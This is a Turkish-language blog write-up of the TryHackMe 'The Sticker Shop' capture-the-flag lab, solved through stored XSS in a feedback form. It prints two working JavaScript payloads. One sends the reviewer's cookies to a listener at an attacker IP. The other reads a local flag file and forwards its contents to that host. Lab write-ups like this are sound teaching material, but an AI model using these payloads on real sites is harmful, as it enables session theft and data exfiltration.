---
title: 'TryHackMe | The Sticker Shop WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [xss]
render_with_liquid: false
media_subpath: /images/tryhackme_the_sticker_shop/
image:
  path: logo.webp
---

Bu yazımda TryHackMe platformunda bulunan “The Sticker Shop” isimli meydan okumanın çözümünü göstereceğim. Kendisi basit seviye bir meydan okumadır ve yapılması gerekenler kısmen belirtilmiştir.

Bulunması gereken tek bir bayrak olduğundan bu meydan okumayı tek hamlede bitireceğiz. Öncelikle bize bayrağın konumunun verildiğini söylemeliyim. Ancak görüntülemeye çalıştığımızda yetkimiz olmadığı için 401 hatasını veriyor.

![](1.webp){: width="1200" height="500" }

Bayrağı nasıl ele geçirebileceğimizi öğrenmek için web uygulaması hakkında biraz bilgiye sahip olmamız gerekiyor. Ana sayfaya döndüğümüzde bir geri bildirim sayfası ile karşılaşıyoruz.

![](2.webp){: width="1200" height="600" }

Nasıl çalıştığını anlamak için rastgele bir şeyler yazdım ve gönderdim. Sonucunda ise mesajın bir çalışana gönderildiğini ve yakın zamanda kontrol edeceğini öğrendim.

Daha sonra XSS açığının olup olmadığını kontrol etmek için netcat ile 8080 portunu dinlemeye aldım ve aşağıdaki javascript kodunu geri bildirim sayfasıyla gönderdim.

```js
<script>fetch('http://10.21.66.61:8080/?=' + document.cookie)</script>
```

Bildirimlerin okunduğu sayfada XSS zafiyeti bulunuyorsa eğer bu javascript kodu ile hem bildirimlerin okunduğu sayfanın yolunu öğrenebilir hem de cookie bilgilerini alabilirdik. Ancak iki bilgiyide elde edemiyoruz.

![](3.webp){: width="1200" height="600" }

En azından XSS zafiyetinin varlığından haberdar olmuş olduk. Anladığım kadarıyla hedef dosyayı yerel ağdan çekmemiz gerekiyor. Bunun içinde XSS zafiyetinden yararlanmalıyız. Javascript’ten pek anlamadığım için internet üzerinden bir arama yaptım ve aşağıdaki kodu buldum.

```js
<script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.21.66.61:8080/?=' + data);
    });
</script>
```

Bu kod personelin sayfasında çalıştığında, önce yerel ağ üzerinden bayrağı alacak daha sonra ise dinlemiş olduğum port’a iletecek.

![](4.webp){: width="1200" height="600" }

Bu şekilde kolay bir meydan okumayı daha bitirmiş olduk. Okuduğunuz için teşekkür ederim.
